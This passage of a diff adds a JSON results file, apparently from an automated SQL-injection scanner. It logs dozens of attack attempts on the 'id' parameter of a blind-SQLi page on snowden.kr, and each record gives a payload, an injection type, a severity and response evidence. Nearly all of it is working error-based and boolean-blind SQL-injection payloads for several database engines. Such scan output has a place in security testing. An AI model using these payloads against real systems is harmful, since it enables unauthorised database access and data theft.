+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0249,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,'x'))x)) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0359,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT CHR(118)||CHR(117)||CHR(110) WHERE 1=1 AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65))) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0234,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 AND EXTRACTVALUE(1,CONCAT('\\',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0341,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 AND 1=CONVERT(INT,(SELECT 0x5356534441414141+(SELECT (CASE WHEN (1=1) THEN '1' ELSE '0' END))+0x5641534441414141)) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0229,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 AND 1 IN (SELECT (0x5356534441414141+(SELECT (CASE WHEN (1=1) THEN '1' ELSE '0' END))+0x5641534441414141)) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0176,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 'v' + 'u' + 'n' WHERE 1=1 OR NOT 1=1 )+'",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0119,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 OR GTID_SUBSET(CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )+'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0102,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,'x'))s), 8446744073709551610, 8446744073709551610))) )+'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0135,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,'x'))x)) )+'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0094,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) USING utf8))) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0122,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 OR ERROR(CONCAT(0x5356534441414141,(SELECT (CASE WHEN (1=1) THEN '1' ELSE '0' END)),0x5641534441414141)) IS NOT NULL )+'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0216,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) USING utf8))) )+'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0209,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,'x'))s), 8446744073709551610, 8446744073709551610))) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0156,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 OR ROW(1,1)>(SELECT COUNT(*),CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,FLOOR(RAND(0)*2))x FROM (SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5)a GROUP BY x) )+'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0187,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 OR EXTRACTVALUE(1,CONCAT('\\',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) )+'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0089,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,FLOOR(RAND(0)*2))x FROM (SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5)a GROUP BY x) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0239,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 OR UPDATEXML(1,CONCAT('.',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )+'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0179,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) )+'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0155,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 'v' + 'u' + 'n' WHERE 1=1 OR 1=('S' + 'V' + 'S' + 'D' + 'A' + 'A' + 'A' + 'A'||(CASE WHEN (1=1) THEN '1' ELSE '0' END)||'V' + 'A' + 'S' + 'D' + 'A' + 'A' + 'A' + 'A') )+'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0254,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(SELECT 0x76756e WHERE 1=1 AND UPDATEXML(1,CONCAT('.',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.026,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 'v' + 'u' + 'n' FROM DUAL WHERE 1=1 AND 1=(SELECT (CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)) )||'",
+        "type": "SQLi-boolean_blind",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0261,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT CHR(118)||CHR(117)||CHR(110) FROM DUAL WHERE 1=1 AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62))) FROM DUAL) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0266,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 'v' + 'u' + 'n' FROM DUAL WHERE 1=1 AND 1=('S' + 'V' + 'S' + 'D' + 'A' + 'A' + 'A' + 'A'||(CASE WHEN (1=1) THEN '1' ELSE '0' END)||'V' + 'A' + 'S' + 'D' + 'A' + 'A' + 'A' + 'A') )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0254,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0275,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT CHR(118)||CHR(117)||CHR(110) FROM DUAL WHERE 1=1 AND 1=CAST(CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END))::text||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65) AS NUMERIC) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0084,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT CHR(118)||CHR(117)||CHR(110) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,(CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65))) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0124,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 'v' + 'u' + 'n' FROM DUAL WHERE 1=1 AND 1=1 )||'",
+        "type": "SQLi-boolean_blind",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0106,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT CHR(118)||CHR(117)||CHR(110) FROM DUAL WHERE 1=1 AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END) FROM DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65))) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0088,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 AND 1=CONCAT(0x5356534441414141,(SELECT (CASE WHEN (1=1) THEN '1' ELSE '0' END)),0x5641534441414141) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0122,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 AND UPDATEXML(1,CONCAT('.',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141),1) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0235,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0243,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,'x'))x)) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0143,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141,'x'))s), 8446744073709551610, 8446744073709551610))) )||'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0246,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 AND 1=CONVERT(INT,(SELECT 0x5356534441414141+(SELECT (CASE WHEN (1=1) THEN '1' ELSE '0' END))+0x5641534441414141)) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0134,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli_blind/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(SELECT 0x76756e FROM DUAL WHERE 1=1 AND EXTRACTVALUE(1,CONCAT('\\',0x5356534441414141,(SELECT (ELT(1=1,1))),0x5641534441414141)) )||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 404,
+        "response_time": 0.0176,
+        "analysis_details": [
+          "[Boolean] Status Code changed: 200 -> 404",
+          "[Boolean] Content length changed by 6 bytes",
+          "[Boolean] Blind keyword 'exists' state inverted",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
